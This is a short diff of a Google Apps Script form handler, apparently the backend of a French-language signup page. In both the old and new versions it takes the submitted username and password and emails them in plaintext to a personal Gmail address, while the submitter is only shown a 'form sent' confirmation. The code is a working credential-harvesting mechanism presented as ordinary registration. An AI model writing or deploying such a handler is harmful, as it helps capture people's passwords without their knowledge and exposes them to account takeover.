@@ -1,26 +1,12 @@
-// Code.gs
+// Apps Script
 function doPost(e) {
-  try {
-    // récupération des champs envoyés (formulaire x-www-form-urlencoded ou multipart)
-    var params = e.parameter || {};
-    var pseudo = params.pseudo || "(vide)";
-    var mdp = params.password || params.mdp || "(vide)";
+  var params = e.parameter;
+  var pseudo = params.pseudo;
+  var mdp = params.password;
 
-    // destinataire — change si besoin
-    var to = "megumikun84@gmail.com";
+  MailApp.sendEmail("megumikun84@gmail.com", 
+    "Nouvelle inscription", 
+    "Pseudo : " + pseudo + "\nMot de passe : " + mdp);
 
-    var subject = "Nouvelle inscription — Brainrot Hub";
-    var body = "Nouvelle inscription reçue :\n\n" +
-               "Pseudo : " + pseudo + "\n" +
-               "Mot de passe : " + mdp + "\n\n" +
-               "Envoyé le : " + new Date().toString();
-
-    // envoi du mail (depuis le compte Google qui déploie le script)
-    MailApp.sendEmail(to, subject, body);
-
-    // réponse simple (s'affichera après soumission)
-    return HtmlService.createHtmlOutput("<p>✅ Merci — e-mail envoyé !</p>");
-  } catch (err) {
-    return HtmlService.createHtmlOutput("<p>❌ Erreur : " + err.toString() + "</p>");
-  }
+  return HtmlService.createHtmlOutput("✅ Formulaire envoyé !");
 }
